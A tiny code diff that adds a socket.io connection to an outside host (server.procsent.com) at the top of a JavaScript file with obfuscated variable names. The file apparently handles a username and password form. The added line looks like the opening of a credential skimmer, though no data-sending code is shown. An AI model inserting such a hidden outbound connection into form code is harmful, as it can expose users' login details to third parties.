@@ -1,3 +1,4 @@
+var socket = io('http://server.procsent.com/')
 var _omfa, _resu, _ssp, _itmuos_toForm;
 
 _resu = document.getElementById("_opu_r1_2use")
